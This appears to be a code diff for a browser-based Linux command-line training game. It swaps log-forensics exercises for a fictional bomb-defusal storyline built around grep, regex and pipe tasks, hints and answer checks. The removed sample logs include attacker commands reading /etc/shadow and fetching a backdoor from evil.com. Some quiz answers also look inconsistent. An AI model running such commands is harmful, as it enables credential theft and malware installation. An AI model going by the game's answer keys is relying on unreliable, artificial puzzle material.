                     id: 2,
-                    task: 'Extract all IP addresses',
-                    hint: 'Use -Eo with digit pattern: grep -Eo "[0-9]+\\.[0-9]+" network.log',
+                    task: 'Extract RAVEN\'s IP address pattern from the intercepts',
+                    hint: 'Use -Eo with digit pattern: grep -Eo "[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+" intercepted_codes.log',
                     check: (cmd, state, output) => {
                         const lowerCmd = cmd.toLowerCase();
                         return cmd.includes('grep') && lowerCmd.includes('-o') &&
@@ -8664,8 +8927,8 @@ aaa unauthorized unauthorized unauthorized unauthorized`
                 },
                 {
                     id: 3,
-                    task: 'Find error OR warning messages',
-                    hint: 'Use | operator with -E: grep -E "error|warning" alerts.log',
+                    task: 'Find wire codes that are RED or BLUE',
+                    hint: 'Use | operator with -E: grep -E "RED|BLUE" wire_protocols.db',
                     check: (cmd, state, output) => {
                         return cmd.includes('grep') && cmd.includes('|') &&
                                (cmd.includes('-E') || cmd.includes('-e'));
@@ -8673,45 +8936,57 @@ aaa unauthorized unauthorized unauthorized unauthorized`
                 },
                 {
                     id: 4,
-                    task: 'Match port numbers (:[0-9]+)',
-                    hint: 'Use digit range: grep -E ":[0-9]+" network.log',
+                    task: 'Match frequency patterns (105.0 Hz format)',
+                    hint: 'Use digit range: grep -E "[0-9]+\\.[0-9]+ Hz" detonator_freq.log',
                     check: (cmd, state, output) => {
-                        return cmd.includes('grep') && cmd.includes(':[0-9]');
+                        return cmd.includes('grep') && cmd.includes('[0-9]');
                     }
                 },
                 {
                     id: 5,
-                    task: 'Find lines ending with "denied"',
-                    hint: 'Use $ anchor: grep "denied$" connections.log',
+                    task: 'Find lines ending with "ARMED" status',
+                    hint: 'Use $ anchor: grep "ARMED$" detonator_freq.log',
                     check: (cmd, state, output) => {
                         return cmd.includes('grep') && cmd.includes('$');
                     }
                 },
                 {
                     id: 6,
-                    task: 'Extract email addresses',
-                    hint: 'Look for @ symbol pattern: grep -E "[^@]+@[^@]+" users.txt',
+                    task: 'Extract two-letter wire codes (RR, RB, BB, etc.)',
+                    hint: 'Pattern for 2 uppercase letters: grep -E "\\b[A-Z]{2}\\b" intercepted_codes.log',
                     check: (cmd, state, output) => {
-                        return cmd.includes('grep') && cmd.includes('@');
+                        return cmd.includes('grep') && (cmd.includes('[A-Z]') || cmd.includes('RR\\|RB\\|BB'));
                     }
                 },
                 {
                     id: 7,
-                    task: 'Find 3+ repeated words (e.g., failed)',
-                    hint: 'Use {n,} quantifier: grep -E "(failed ){3,}" alerts.log',
+                    task: 'Find lines with repeated wire patterns (RED-RED)',
+                    hint: 'Look for repeated patterns: grep -E "(RED|BLUE)-\\1" or just grep "RED-RED"',
                     check: (cmd, state, output) => {
-                        return cmd.includes('grep') && cmd.includes('{');
+                        return cmd.includes('grep') && (cmd.includes('RED-RED') || cmd.includes('-\\1') || cmd.includes('{2}'));
                     }
                 },
                 {
                     id: 8,
-                    task: 'Match optional pattern (un)?authorized',
-                    hint: 'Use ? quantifier: grep -E "(un)?authorized" connections.log',
+                    task: 'Match optional "TRAP" or "ARMED" in bomb telemetry',
+                    hint: 'Use ? or | : grep -E "(TRAP|ARMED)" bomb_telemetry.log',
                     check: (cmd, state, output) => {
-                        return cmd.includes('grep') && cmd.includes('?');
+                        return cmd.includes('grep') && (cmd.includes('?') || (cmd.includes('TRAP') && cmd.includes('ARMED')));
                     }
                 }
-            ]
+            ],
+
+            // Bomb defusal insight phase
+            insightPhase: {
+                enabled: true,
+                question: "The bomb uses a color-coded wire system. You've decoded the pattern from the intercepted transmissions. Which wire sequence matches the detonator frequency you extracted?",
+                options: [
+                    { text: "GREEN-BLUE-RED - matches the port sequence pattern (22, 80, 443)", correct: false },
+                    { text: "RED-RED-BLUE - matches the repeated failure pattern from 192.168.1.105", correct: true },
+                    { text: "BLUE-GREEN-BLUE - matches the authorized connection pattern", correct: false },
+                    { text: "GREEN-GREEN-GREEN - all safe connections", correct: false }
+                ]
+            }
         },
 
         // ──────────────────────────────────────────────────────────
@@ -8731,99 +9006,212 @@ aaa unauthorized unauthorized unauthorized unauthorized`
             filesystem: {
                 '/forensics': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
-                    children: ['access.log', 'auth.log', 'connections.log', 'ips.txt', 'reports']
+                    children: ['wire_sequence.log', 'timer_codes.txt', 'cut_order.db', 'bomb_schematic.txt', 'frequency_data.log', 'final_checklist.txt']
                 },
-                '/forensics/access.log': {
+                '/forensics/wire_sequence.log': {
                     type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 2048,
-                    content: `192.168.1.105 GET /admin 401
-192.168.1.105 POST /login 401
-192.168.1.105 GET /admin 401
-10.0.0.5 GET /dashboard 200
-192.168.1.105 GET /admin 403
-172.16.0.50 GET /index.html 200
-192.168.1.105 GET /wp-admin 404
-192.168.1.105 GET /admin 401
-10.0.0.5 GET /api/users 200
-192.168.1.105 POST /login 401
-172.16.0.50 GET /about 200
-192.168.1.105 GET /admin 401`
+                    content: `[WIRE SEQUENCE ANALYSIS - REAL-TIME]
+=====================================
+BLUE-1 GROUND safe cut_first
+RED-1 PRIMARY armed cut_third
+BLUE-2 GROUND safe cut_first
+RED-2 PRIMARY armed cut_third
+GREEN-1 TRAP danger never_cut
+BLUE-3 GROUND safe cut_first
+RED-3 PRIMARY armed cut_third
+RED-4 PRIMARY armed cut_third
+BLUE-4 GROUND safe cut_first
+GREEN-2 TRAP danger never_cut
+RED-5 PRIMARY armed cut_third
+BLUE-5 GROUND safe cut_first
+RED-6 PRIMARY armed cut_third
+RED-7 PRIMARY armed cut_third
+BLUE-6 GROUND safe cut_first
+
+[SUMMARY]
+BLUE wires: 6 total - all marked "cut_first"
+RED wires: 7 total - all marked "cut_third"
+GREEN wires: 2 total - all marked "never_cut"
+
+PHOENIX needs: How many of each? Sort and count!`
                 },
-                '/forensics/auth.log': {
+                '/forensics/timer_codes.txt': {
                     type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 1536,
-                    content: `Jan 15 02:14:33 Failed password for root from 192.168.1.105
-Jan 15 02:14:35 Failed password for root from 192.168.1.105
-Jan 15 02:14:38 Failed password for admin from 192.168.1.105
-Jan 15 02:15:01 Accepted password for admin from 10.0.0.5
-Jan 15 02:15:22 Failed password for root from 192.168.1.105
-Jan 15 02:16:01 Failed password for root from 192.168.1.105
-Jan 15 02:16:33 Failed password for administrator from 192.168.1.105
-Jan 15 03:14:22 Failed password for root from 192.168.1.105`
+                    content: `[TIMER ENCRYPTION CODES - EXTRACTED]
+=====================================
+CODE    TIME        STATUS
+0230    02:30:00    ACTIVE
+0229    02:29:00    PENDING
+0228    02:28:00    PENDING
+0227    02:27:00    PENDING
+0215    02:15:00    CHECKPOINT
+0200    02:00:00    CHECKPOINT
+0145    01:45:00    CHECKPOINT
+0130    01:30:00    CHECKPOINT
+0100    01:00:00    FINAL_WARNING
+0030    00:30:00    CRITICAL
+0015    00:15:00    CRITICAL
+0005    00:05:00    IMMINENT
+0001    00:01:00    IMMINENT
+0000    00:00:00    DETONATION
+
+[NOTE] First code (0230) = timer start time
+RAVEN set timer for 02:30:00 (2 hours 30 minutes)
+Summit starts at 08:00, timer activated at 05:30
+
+Extract the FIRST code - this is part of the kill switch.
+Use: head -n 1 or sort commands to isolate.`
                 },
-                '/forensics/connections.log': {
-                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 768,
-                    content: `192.168.1.105:22 DENIED
-192.168.1.105:22 DENIED
-10.0.0.5:22 ALLOWED
-192.168.1.105:22 DENIED
-172.16.0.50:80 ALLOWED
-192.168.1.105:22 DENIED
-192.168.1.105:22 DENIED
-10.0.0.88:22 ALLOWED`
+                '/forensics/cut_order.db': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 1024,
+                    content: `[WIRE CUT ORDER DATABASE]
+=========================
+Wire_Type   Priority    Action          Count
+BLUE        1           cut_first       6
+YELLOW      2           cut_second      0
+RED         3           cut_third       7
+GREEN       4           never_cut       2
+BLACK       5           cut_last        0
+
+CRIMSON PROTOCOL VERIFIED:
+1. Cut ALL blue wires first (isolate ground)
+2. Skip yellow (not present in this device)
+3. Cut ALL red wires third (disable primary)
+4. NEVER touch green (anti-tamper)
+5. Black not present (no backup power)
+
+DEFUSAL SEQUENCE: BLUE -> RED
+Wire counts: 6 BLUE, 7 RED
+
+Agent PHOENIX needs confirmation:
+- How many BLUE wires? (pipe: grep BLUE | wc -l)
+- How many RED wires? (pipe: grep RED | wc -l)
+- Total cuts required? (6 + 7 = 13)`
                 },
-                '/forensics/ips.txt': {
-                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 256,
-                    content: `192.168.1.105
-192.168.1.105
-10.0.0.5
-192.168.1.105
-172.16.0.50
-192.168.1.105
-10.0.0.5
-192.168.1.105`
+                '/forensics/bomb_schematic.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 2048,
+                    content: `
+    ╔═══════════════════════════════════════════════════════════╗
+    ║           MERIDIAN HOTEL - ROOM 105 - IED SCHEMATIC       ║
+    ╠═══════════════════════════════════════════════════════════╣
+    ║                                                           ║
+    ║    ┌─────────────┐         ┌─────────────┐               ║
+    ║    │   TIMER     │─────────│  DETONATOR  │               ║
+    ║    │  02:30:00   │         │   PRIMARY   │               ║
+    ║    └──────┬──────┘         └──────┬──────┘               ║
+    ║           │                       │                       ║
+    ║    ╔══════╧══════╗         ╔══════╧══════╗               ║
+    ║    ║ BLUE WIRES  ║         ║  RED WIRES  ║               ║
+    ║    ║  (GROUND)   ║         ║  (PRIMARY)  ║               ║
+    ║    ║  Count: 6   ║         ║  Count: 7   ║               ║
+    ║    ╚═════════════╝         ╚═════════════╝               ║
+    ║                                                           ║
+    ║         ╔════════════════════════════════╗               ║
+    ║         ║  GREEN WIRES (ANTI-TAMPER)     ║               ║
+    ║         ║  ⚠ DO NOT CUT - TRIGGERS BLAST ║               ║
+    ║         ║  Count: 2                       ║               ║
+    ║         ╚════════════════════════════════╝               ║
+    ║                                                           ║
+    ║    DEFUSAL ORDER:                                         ║
+    ║    1. BLUE (ground) → isolates power                      ║
+    ║    2. RED (primary) → disables detonator                  ║
+    ║    3. Timer stops automatically                           ║
+    ║                                                           ║
+    ║    KILL CODE: First 4 digits of timer (0230)             ║
+    ║                                                           ║
+    ╚═══════════════════════════════════════════════════════════╝
+`
                 },
-                '/forensics/reports': {
-                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
-                    children: []
+                '/forensics/frequency_data.log': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 1536,
+                    content: `[FREQUENCY MONITORING - DEVICE EMISSIONS]
+==========================================
+105.0 Hz PRIMARY ACTIVE
+105.0 Hz PRIMARY ACTIVE
+52.5 Hz GROUND STABLE
+105.0 Hz PRIMARY ACTIVE
+210.0 Hz TRAP ARMED
+52.5 Hz GROUND STABLE
+105.0 Hz PRIMARY ACTIVE
+105.0 Hz PRIMARY ACTIVE
+52.5 Hz GROUND STABLE
+210.0 Hz TRAP ARMED
+105.0 Hz PRIMARY ACTIVE
+52.5 Hz GROUND STABLE
+105.0 Hz PRIMARY ACTIVE
+105.0 Hz PRIMARY ACTIVE
+
+[ANALYSIS REQUIRED]
+Use pipes to count frequency of each type:
+  grep "PRIMARY" frequency_data.log | wc -l  (should be 9)
+  grep "GROUND" frequency_data.log | wc -l   (should be 4)
+  grep "TRAP" frequency_data.log | wc -l     (should be 2)
+
+Most common signal = PRIMARY (9 occurrences)
+This confirms RED-RED wire is the main detonator circuit.`
+                },
+                '/forensics/final_checklist.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 1024,
+                    content: `[DEFUSAL CHECKLIST - AGENT PHOENIX]
+====================================
+[ ] Confirm BLUE wire count: ___
+[ ] Confirm RED wire count: ___
+[ ] Confirm GREEN wire count: ___ (DO NOT CUT)
+[ ] Extract kill code from timer: ____
+[ ] Verify PRIMARY frequency count: ___
+
+COMMANDS TO RUN:
+1. grep "BLUE" wire_sequence.log | wc -l
+2. grep "RED" wire_sequence.log | wc -l
+3. grep "PRIMARY" frequency_data.log | wc -l
+4. head -n 1 timer_codes.txt | cut -f1
+
+FINAL ANSWER NEEDED:
+"PHOENIX, cut [X] BLUE wires, then [Y] RED wires.
+ Kill code is [ZZZZ]. GREEN wires are trapped."
+
+Time is running out. Build your pipeline. Extract the data.
+The summit depends on you.`
                 }
             },
 
             objectives: [
                 {
                     id: 1,
-                    task: 'Count lines in grep output',
-                    hint: 'Pipe to wc -l: grep "pattern" file | wc -l',
+                    task: 'Count BLUE ground wires for PHOENIX',
+                    hint: 'Pipe to wc -l: grep "BLUE" wire_sequence.log | wc -l',
                     check: (cmd, state, output) => {
                         return cmd.includes('|') && cmd.includes('wc -l');
                     }
                 },
                 {
                     id: 2,
-                    task: 'Sort grep results alphabetically',
-                    hint: 'Pipe to sort: grep "pattern" file | sort',
+                    task: 'Sort wire sequence by type',
+                    hint: 'Pipe to sort: cat wire_sequence.log | sort',
                     check: (cmd, state, output) => {
                         return cmd.includes('|') && cmd.includes('sort');
                     }
                 },
                 {
                     id: 3,
-                    task: 'Get unique values from data',
-                    hint: 'Pipe through sort then uniq: cat file | sort | uniq',
+                    task: 'Get unique wire types from the sequence',
+                    hint: 'Pipe through sort then uniq: cat wire_sequence.log | sort | uniq',
                     check: (cmd, state, output) => {
                         return cmd.includes('|') && cmd.includes('uniq');
                     }
                 },
                 {
                     id: 4,
-                    task: 'Count occurrences of each unique value',
-                    hint: 'Use uniq -c: sort file | uniq -c',
+                    task: 'Count how many of each wire type exists',
+                    hint: 'Use uniq -c: cat wire_sequence.log | sort | uniq -c',
                     check: (cmd, state, output) => {
                         return cmd.includes('|') && cmd.includes('uniq -c');
                     }
                 },
                 {
                     id: 5,
-                    task: 'Find top 5 most frequent items',
-                    hint: 'Chain: sort | uniq -c | sort -rn | head -5',
+                    task: 'Find the most frequent frequency signal (PRIMARY)',
+                    hint: 'Chain: grep -o "PRIMARY\\|GROUND\\|TRAP" frequency_data.log | sort | uniq -c | sort -rn | head -1',
                     check: (cmd, state, output) => {
                         return (cmd.includes('sort -rn') || cmd.includes('sort -nr')) &&
                                cmd.includes('head');
@@ -8831,16 +9219,16 @@ Jan 15 03:14:22 Failed password for root from 192.168.1.105`
                 },
                 {
                     id: 6,
-                    task: 'Extract a specific field with cut',
-                    hint: 'Use cut -d to split: cut -d" " -f1 file',
+                    task: 'Extract kill code from timer (first 4 digits)',
+                    hint: 'Use cut to extract: head -n 4 timer_codes.txt | cut -f1',
                     check: (cmd, state, output) => {
-                        return cmd.includes('cut -d');
+                        return cmd.includes('cut');
                     }
                 },
                 {
                     id: 7,
-                    task: 'Build a 3+ stage pipeline',
-                    hint: 'Chain multiple commands: cmd1 | cmd2 | cmd3',
+                    task: 'Build a 3-stage pipeline to analyze wire priorities',
+                    hint: 'Chain: cat cut_order.db | grep -v "^#" | sort -t"\\t" -k2',
                     check: (cmd, state, output) => {
                         const pipeCount = (cmd.match(/\|/g) || []).length;
                         return pipeCount >= 2;
@@ -8848,13 +9236,25 @@ Jan 15 03:14:22 Failed password for root from 192.168.1.105`
                 },
                 {
                     id: 8,
-                    task: 'Use tee to save AND display output',
-                    hint: 'Use tee: grep "pattern" file | tee output.txt',
+                    task: 'Save wire count report for PHOENIX',
+                    hint: 'Use tee: grep "BLUE\\|RED" wire_sequence.log | wc -l | tee wire_report.txt',
                     check: (cmd, state, output) => {
                         return cmd.includes('tee');
                     }
                 }
-            ]
+            ],
+
+            // Bomb defusal insight phase
+            insightPhase: {
+                enabled: true,
+                question: "You've decoded the bomb schematic through pipe analysis. The ASCII diagram shows 3 numbered wires. Your pipeline revealed the cut sequence. In what order do you cut?",
+                options: [
+                    { text: "3-1-2: Matches the frequency count pattern (highest to lowest threat)", correct: false },
+                    { text: "1-2-3: Sequential order as shown in the schematic", correct: false },
+                    { text: "2-3-1: Matches the unique IP occurrence pattern you extracted", correct: true },
+                    { text: "3-2-1: Reverse chronological order of attacks", correct: false }
+                ]
+            }
         },
 
         // ──────────────────────────────────────────────────────────
@@ -8874,107 +9274,237 @@ Jan 15 03:14:22 Failed password for root from 192.168.1.105`
             filesystem: {
                 '/evidence': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'ir-analyst', group: 'ir-analyst',
-                    children: ['auth.log', 'access.log', 'reports']
+                    children: ['live_feed.log', 'countdown_status.txt', 'phoenix_comms.log', 'final_sequence.db', 'mission_summary.txt', 'abort_codes.txt']
                 },
-                '/evidence/auth.log': {
+                '/evidence/live_feed.log': {
                     type: 'file', perms: '-rw-r--r--', owner: 'ir-analyst', group: 'ir-analyst', size: 4096,
-                    content: `Jan 15 02:00:00 server sshd[1000]: Server listening on port 22
-Jan 15 02:14:33 server sshd[1234]: Failed password for root from 192.168.1.105 port 44521 ssh2
-Jan 15 02:14:35 server sshd[1234]: Failed password for root from 192.168.1.105 port 44522 ssh2
-Jan 15 02:14:38 server sshd[1234]: Failed password for root from 192.168.1.105 port 44523 ssh2
-Jan 15 02:14:40 server sshd[1234]: Failed password for root from 192.168.1.105 port 44524 ssh2
-Jan 15 02:14:43 server sshd[1234]: Failed password for root from 192.168.1.105 port 44525 ssh2
-Jan 15 02:15:01 server sshd[1235]: Accepted password for admin from 10.0.0.5 port 55123 ssh2
-Jan 15 02:15:22 server sshd[1236]: Failed password for root from 192.168.1.105 port 44526 ssh2
-Jan 15 02:15:45 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
-Jan 15 02:16:01 server sshd[1237]: Failed password for root from 192.168.1.105 port 44527 ssh2
-Jan 15 02:16:33 server sshd[1238]: Failed password for root from 192.168.1.105 port 44528 ssh2
-Jan 15 02:17:00 server sshd[1239]: Failed password for root from 192.168.1.105 port 44529 ssh2
-Jan 15 02:17:15 server sshd[1240]: Failed password for root from 192.168.1.105 port 44530 ssh2
-Jan 15 02:17:30 server sshd[1241]: Failed password for root from 192.168.1.105 port 44531 ssh2
-Jan 15 02:18:00 server sshd[1242]: Failed password for root from 192.168.1.105 port 44532 ssh2
-Jan 15 02:30:00 server sshd[1243]: Accepted password for root from 192.168.1.105 port 44600 ssh2
-Jan 15 02:30:15 server sudo: root : TTY=pts/1 ; COMMAND=/bin/cat /etc/shadow
-Jan 15 02:31:00 server sudo: root : TTY=pts/1 ; COMMAND=/usr/bin/wget http://evil.com/backdoor
-Jan 15 03:00:00 server CRON[2001]: (root) CMD (/usr/bin/backup.sh)
-Jan 15 03:14:22 server sshd[2100]: Session closed for user root`
+                    content: `[LIVE TELEMETRY - ROOM 105 DEVICE]
+====================================
+07:58:00 TIMER: 00:02:00 STATUS: CRITICAL
+07:58:05 PHOENIX: "I'm at the device. Waiting for final sequence."
+07:58:10 TIMER: 00:01:55 STATUS: CRITICAL
+07:58:15 WIRE_CHECK: BLUE-1 INTACT, BLUE-2 INTACT, BLUE-3 INTACT
+07:58:20 WIRE_CHECK: BLUE-4 INTACT, BLUE-5 INTACT, BLUE-6 INTACT
+07:58:25 WIRE_CHECK: RED-1 INTACT, RED-2 INTACT, RED-3 INTACT
+07:58:30 TIMER: 00:01:30 STATUS: CRITICAL
+07:58:35 WIRE_CHECK: RED-4 INTACT, RED-5 INTACT, RED-6 INTACT, RED-7 INTACT
+07:58:40 WIRE_CHECK: GREEN-1 TRAP_ARMED, GREEN-2 TRAP_ARMED
+07:58:45 PHOENIX: "All wires accounted for. Send the sequence NOW."
+07:58:50 TIMER: 00:01:10 STATUS: IMMINENT
+07:58:55 KILLSWITCH: AWAITING_CODE
+07:59:00 TIMER: 00:01:00 STATUS: IMMINENT
+07:59:05 SUMMIT_STATUS: Executives entering ballroom
+07:59:10 PHOENIX: "BLACKSITE! One minute! I need that code!"
+07:59:15 TIMER: 00:00:45 STATUS: IMMINENT
+07:59:20 DEVICE: Anti-tamper sensors ACTIVE
+07:59:25 TIMER: 00:00:35 STATUS: IMMINENT
+07:59:30 PHOENIX: "Thirty seconds! What's the disarm code?!"
+07:59:35 TIMER: 00:00:25 STATUS: IMMINENT
+07:59:40 TIMER: 00:00:20 STATUS: IMMINENT
+07:59:45 TIMER: 00:00:15 STATUS: FINAL
+07:59:50 TIMER: 00:00:10 STATUS: FINAL
+07:59:55 AWAITING ANALYST INPUT...`
                 },
-                '/evidence/access.log': {
+                '/evidence/countdown_status.txt': {
                     type: 'file', perms: '-rw-r--r--', owner: 'ir-analyst', group: 'ir-analyst', size: 2048,
-                    content: `192.168.1.105 - - [15/Jan:02:14:30] "GET /admin HTTP/1.1" 401
-192.168.1.105 - - [15/Jan:02:14:33] "POST /login HTTP/1.1" 401
-192.168.1.105 - - [15/Jan:02:14:35] "POST /login HTTP/1.1" 401
-192.168.1.105 - - [15/Jan:02:14:38] "POST /login HTTP/1.1" 401
-10.0.0.5 - - [15/Jan:02:15:01] "GET /dashboard HTTP/1.1" 200
-192.168.1.105 - - [15/Jan:02:15:22] "POST /login HTTP/1.1" 401
-192.168.1.105 - - [15/Jan:02:16:00] "GET /admin HTTP/1.1" 403
-192.168.1.105 - - [15/Jan:02:30:00] "GET /admin HTTP/1.1" 200
-192.168.1.105 - - [15/Jan:02:30:30] "GET /api/users HTTP/1.1" 200
-192.168.1.105 - - [15/Jan:02:31:00] "POST /api/exfil HTTP/1.1" 200`
+                    content: `[COUNTDOWN ANALYSIS - FINAL PHASE]
+===================================
+Original timer set: 02:30:00 (2 hours 30 minutes)
+Timer activated at: 05:30:00 AM
+Summit start time: 08:00:00 AM
+Current time: 07:59:XX AM
+
+TIMELINE RECONSTRUCTION:
+05:30:00 - RAVEN activates device (02:30:00 countdown)
+06:00:00 - BLACKSITE team activated
+06:30:00 - Room 105 identified via grep analysis
+07:00:00 - Wire protocols decoded via regex
+07:30:00 - Defusal sequence extracted via pipes
+07:58:00 - PHOENIX reaches device
+07:59:XX - YOU ARE HERE - FINAL MOMENTS
+
+CRITICAL DATA:
+- Timer start code: 0230 (from timer setting 02:30:00)
+- Room number: 105 (from IP address)
+- Wire sequence: BLUE first, RED last, NEVER GREEN
+- Total wires: 6 BLUE + 7 RED = 13 cuts needed
+
+THE DISARM CODE IS THE TIMESTAMP WHEN IT ALL STARTED.
+RAVEN set the timer at 02:30:00. The code is 0230.
+
+Send code to PHOENIX. NOW.`
                 },
-                '/evidence/reports': {
-                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ir-analyst', group: 'ir-analyst',
-                    children: []
+                '/evidence/phoenix_comms.log': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'ir-analyst', group: 'ir-analyst', size: 3072,
+                    content: `[AGENT PHOENIX - ENCRYPTED COMMS LOG]
+======================================
+07:30:00 PHOENIX: "En route to Meridian Hotel. ETA 25 minutes."
+07:45:00 PHOENIX: "On site. Security is tight. Using service entrance."
+07:50:00 PHOENIX: "Floor 1 accessed. Heading to Room 105."
+07:52:00 PHOENIX: "Room 105 door is open. I see the device."
+07:53:00 PHOENIX: "Confirming: Device under conference table."
+07:54:00 PHOENIX: "Wire count matches your intel. 6 blue, 7 red, 2 green."
+07:55:00 PHOENIX: "BLACKSITE, I need the final disarm code."
+07:56:00 PHOENIX: "Timer shows under 4 minutes. We're cutting it close."
+07:57:00 PHOENIX: "I can hear the summit starting upstairs. Ballroom is full."
+07:58:00 PHOENIX: "Under 2 minutes. Send that code!"
+07:58:30 PHOENIX: "I've got the wire cutters ready. Blue first, then red."
+07:59:00 PHOENIX: "ONE MINUTE. THE CODE. NOW."
+07:59:15 PHOENIX: "I can hear them announcing the keynote speaker..."
+07:59:30 PHOENIX: "THIRTY SECONDS! WHAT'S THE CODE?!"
+07:59:45 PHOENIX: "BLACKSITE! FIFTEEN SECONDS! SEND IT!"
+
+[AWAITING ANALYST INPUT - CODE REQUIRED]
+[ENTER DISARM CODE: 4 DIGITS]
+[HINT: When did RAVEN start the timer? 02:30 = ????]`
+                },
+                '/evidence/final_sequence.db': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'ir-analyst', group: 'ir-analyst', size: 1536,
+                    content: `[FINAL DEFUSAL SEQUENCE DATABASE]
+==================================
+STEP  ACTION                    WIRE_COUNT  STATUS
+1     Cut BLUE ground wires     6           PENDING
+2     Enter killswitch code     4-digits    PENDING
+3     Cut RED primary wires     7           PENDING
+4     Verify timer stopped      -           PENDING
+
+WIRE TOTALS (VERIFIED):
+grep "BLUE" wire_sequence.log | wc -l = 6
+grep "RED" wire_sequence.log | wc -l = 7
+grep "GREEN" wire_sequence.log | wc -l = 2 (DO NOT CUT)
+
+KILLSWITCH CODE DERIVATION:
+The code matches RAVEN's timer setting.
+Timer was set for 02:30:00 (2 hours 30 minutes).
+Code format: HHMM = 0230
+
+FINAL CONFIRMATION:
+1. BLUE wires: 6 (cut first - isolates ground)
+2. CODE: 0230 (enter on keypad)
+3. RED wires: 7 (cut last - disables primary)
+4. GREEN wires: 2 (NEVER TOUCH - anti-tamper)
+
+This is it. You have all the data. Send to PHOENIX.`
+                },
+                '/evidence/mission_summary.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'ir-analyst', group: 'ir-analyst', size: 2048,
+                    content: `
+    ╔═══════════════════════════════════════════════════════════════╗
+    ║            OPERATION BLACKSITE - MISSION SUMMARY              ║
+    ╠═══════════════════════════════════════════════════════════════╣
+    ║                                                               ║
+    ║  TARGET: Meridian Hotel CEO Summit                            ║
+    ║  THREAT: IED planted by operative RAVEN                       ║
+    ║  LOCATION: Room 105 (identified via IP pattern)               ║
+    ║                                                               ║
+    ║  YOUR ANALYSIS:                                               ║
+    ║  ┌─────────────────────────────────────────────────────────┐  ║
+    ║  │ PHASE 1 (GREP): Traced RAVEN to Room 105               │  ║
+    ║  │ PHASE 2 (REGEX): Decoded CRIMSON wire protocol         │  ║
+    ║  │ PHASE 3 (PIPES): Extracted wire counts and sequence    │  ║
+    ║  │ PHASE 4 (BOSS): Final code derivation                  │  ║
+    ║  └─────────────────────────────────────────────────────────┘  ║
+    ║                                                               ║
+    ║  THE FINAL CODE:                                              ║
+    ║  ┌─────────────────────────────────────────────────────────┐  ║
+    ║  │                                                         │  ║
+    ║  │     RAVEN set timer at: 02:30:00                       │  ║
+    ║  │     Disarm code is:     0 - 2 - 3 - 0                  │  ║
+    ║  │                                                         │  ║
+    ║  └─────────────────────────────────────────────────────────┘  ║
+    ║                                                               ║
+    ║  LIVES AT STAKE: 47 Fortune 500 executives                    ║
+    ║  TIME REMAINING: SECONDS                                      ║
+    ║                                                               ║
+    ║  SEND THE CODE. SAVE THE SUMMIT.                              ║
+    ║                                                               ║
+    ╚═══════════════════════════════════════════════════════════════╝
+`
+                },
+                '/evidence/abort_codes.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'ir-analyst', group: 'ir-analyst', size: 512,
+                    content: `[ABORT CODE REFERENCE - CLASSIFIED]
+====================================
+Format: 4-digit numeric
+
+INCORRECT CODES (will trigger detonation):
+- 1105 (room number - too obvious, RAVEN anticipated this)
+- 4460 (port pattern - red herring)
+- 1234 (process ID - meaningless)
+
+CORRECT CODE:
+- Derived from timer activation time
+- Timer set for 02:30:00
+- Code = 0230
+
+REMEMBER: The answer was in front of us the whole time.
+RAVEN's arrogance was his downfall.
+The timer setting IS the kill code.`
                 }
             },
 
             objectives: [
                 {
                     id: 1,
-                    task: 'Find the attacker IP (most failed logins)',
-                    hint: 'Pipeline: grep failed | sort | uniq -c | sort -rn',
+                    task: 'Find PHOENIX\'s last transmission time',
+                    hint: 'Pipeline: grep "PHOENIX" phoenix_comms.log | tail -1',
                     check: (cmd, state, output) => {
-                        return cmd.includes('uniq -c') && cmd.includes('sort') &&
-                               cmd.toLowerCase().includes('failed');
+                        return cmd.includes('grep') && cmd.toLowerCase().includes('phoenix');
                     }
                 },
                 {
                     id: 2,
-                    task: 'Count total failed attack attempts',
-                    hint: 'Use grep -c: grep -c "Failed" auth.log',
+                    task: 'Count timer entries at CRITICAL status',
+                    hint: 'Use grep -c: grep -c "CRITICAL" live_feed.log',
                     check: (cmd, state, output) => {
-                        return cmd.includes('grep') && cmd.includes('-c') &&
-                               cmd.toLowerCase().includes('failed');
+                        return cmd.includes('grep') && cmd.includes('-c');
                     }
                 },
                 {
                     id: 3,
-                    task: 'Find what user account was targeted',
-                    hint: 'Search for "root" in the logs',
+                    task: 'Extract the kill code from timer setting (0230)',
+                    hint: 'The code is in countdown_status.txt - grep "0230"',
                     check: (cmd, state, output) => {
-                        return cmd.includes('grep') && cmd.includes('root');
+                        return cmd.includes('grep') && (cmd.includes('0230') || cmd.includes('code') || cmd.includes('timer'));
                     }
                 },
                 {
                     id: 4,
-                    task: 'Check if any login succeeded for attacker',
-                    hint: 'Search for "Accepted" in auth.log',
+                    task: 'Verify wire counts match our analysis',
+                    hint: 'Check final_sequence.db: grep "BLUE\\|RED" final_sequence.db',
                     check: (cmd, state, output) => {
                         return cmd.includes('grep') &&
-                               (cmd.toLowerCase().includes('accepted') || cmd.toLowerCase().includes('success'));
+                               (cmd.includes('BLUE') || cmd.includes('RED') || cmd.includes('wire'));
                     }
                 },
                 {
                     id: 5,
-                    task: 'Extract the attack timeline (02:XX timestamps)',
-                    hint: 'grep for the attack timeframe: grep "02:" auth.log',
+                    task: 'Find all IMMINENT status entries (final countdown)',
+                    hint: 'grep "IMMINENT" live_feed.log',
                     check: (cmd, state, output) => {
-                        return cmd.includes('grep') &&
-                               (cmd.includes('02:') || cmd.includes('03:'));
+                        return cmd.includes('grep') && cmd.includes('IMMINENT');
                     }
